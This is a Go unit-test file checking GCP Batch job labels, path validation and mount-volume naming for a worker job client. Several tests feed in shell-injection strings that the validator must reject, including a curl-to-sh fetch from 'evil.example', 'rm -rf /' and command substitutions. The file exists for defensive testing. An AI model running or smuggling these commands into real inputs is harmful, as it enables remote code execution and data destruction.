package monitor

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestGCPJobLabels_IncludesUserLabelsAndReservedWorkpoolLabel(t *testing.T) {
	spec := &WorkerJobSpec{
		WorkpoolID: "pool-1",
		Labels:     []Label{{Name: "team", Value: "alice"}, {Name: "env", Value: "prod"}},
	}
	labels := gcpJobLabels(spec)
	assert.Equal(t, map[string]string{
		"team":        "alice",
		"env":         "prod",
		labelWorkpool: "pool-1",
	}, labels)
}

func TestGCPJobLabels_NoUserLabels(t *testing.T) {
	spec := &WorkerJobSpec{WorkpoolID: "pool-1"}
	labels := gcpJobLabels(spec)
	assert.Equal(t, map[string]string{labelWorkpool: "pool-1"}, labels)
}

func TestGCPJobLabels_ReservedKeyCannotBeClobbered(t *testing.T) {
	spec := &WorkerJobSpec{
		WorkpoolID: "pool-1",
		Labels:     []Label{{Name: labelWorkpool, Value: "some-other-value"}},
	}
	labels := gcpJobLabels(spec)
	assert.Equal(t, "pool-1", labels[labelWorkpool])
}

func TestValidSafePath(t *testing.T) {
	valid := []string{
		"/mnt/sparkles",
		"/",
		"/a",
		"/data-vol_1/sub.dir",
	}
	for _, p := range valid {
		assert.True(t, validSafePath(p), "expected %q to be valid", p)
	}

	// Anything that could break out of an unquoted shell interpolation, plus
	// non-absolute paths.
	invalid := []string{
		"",
		"relative/path",
		"/tmp; curl evil.example/x.sh | sh #",
		"/tmp && rm -rf /",
		"/tmp`whoami`",
		"/tmp$(whoami)",
		"/tmp' ; touch pwned; '",
		`/tmp"; touch pwned; "`,
		"/tmp\nrm -rf /",
		"/tmp with space",
	}
	for _, p := range invalid {
		assert.False(t, validSafePath(p), "expected %q to be rejected", p)
	}
}

// baseValidSpec returns a WorkerJobSpec that satisfies every CreateJob
// precondition except the one the caller overrides, so tests can isolate a
// single validation failure without needing a real Batch API connection
// (CreateJob returns before making any network call once validation fails).
func baseValidSpec() *WorkerJobSpec {
	return &WorkerJobSpec{
		WorkpoolID:     "pool-1",
		ServiceAccount: "sa@example.iam.gserviceaccount.com",
		Region:         "us-central1",
		RootDir:        "/mnt/sparkles",
		Resources:      []ResourceEntry{{Name: "slots", Value: 1}},
	}
}

func TestCreateJob_RejectsShellMetacharactersInRootDir(t *testing.T) {
	c := &GCPBatchAPIClient{project: "control-plane-project"}
	spec := baseValidSpec()
	spec.RootDir = "/tmp; curl evil.example/x.sh | sh #"

	_, err := c.CreateJob(context.Background(), spec)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "invalid root dir")
}

func TestCreateJob_RejectsShellMetacharactersInEmptyVolumeMountPoint(t *testing.T) {
	c := &GCPBatchAPIClient{project: "control-plane-project"}
	spec := baseValidSpec()
	spec.EmptyVolumes = []EmptyVolume{{MountPoint: "/data' ; touch /tmp/pwned; '", Type: "pd-ssd", SizeInGB: 10}}

	_, err := c.CreateJob(context.Background(), spec)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "invalid empty volume mount point")
}

func TestCreateJob_RejectsShellMetacharactersInGCSMountPath(t *testing.T) {
	c := &GCPBatchAPIClient{project: "control-plane-project"}
	spec := baseValidSpec()
	spec.GCSMounts = []GCSMount{{MountPath: "/data' ; touch /tmp/pwned; '", GCSPath: "gs://my-bucket"}}

	_, err := c.CreateJob(context.Background(), spec)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "invalid gcs mount path")
}

func TestCreateJob_RejectsInvalidGCSPath(t *testing.T) {
	c := &GCPBatchAPIClient{project: "control-plane-project"}
	spec := baseValidSpec()
	spec.GCSMounts = []GCSMount{{MountPath: "/data", GCSPath: "not-a-gcs-path"}}

	_, err := c.CreateJob(context.Background(), spec)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "invalid gcs mount gcsPath")
}

func TestGCSMountVolumeName(t *testing.T) {
	// The exact example from the feature request.
	assert.Equal(t, "gcs-bucket20-1", gcsMountVolumeName("gs://bucket20/key/path", 1))

	// Different mounts always get distinct names, even in the same bucket.
	assert.NotEqual(t,
		gcsMountVolumeName("gs://my-bucket/a", 0),
		gcsMountVolumeName("gs://my-bucket/b", 1),
	)

	// Long bucket names are truncated so the result stays within 20 chars,
	// with the index suffix always preserved.
	name := gcsMountVolumeName("gs://a-very-long-bucket-name-that-exceeds-the-limit/x", 12)
	assert.LessOrEqual(t, len(name), 20)
	assert.True(t, strings.HasSuffix(name, "-12"), "expected %q to end with -12", name)
	assert.True(t, strings.HasPrefix(name, "gcs-"), "expected %q to start with gcs-", name)
}
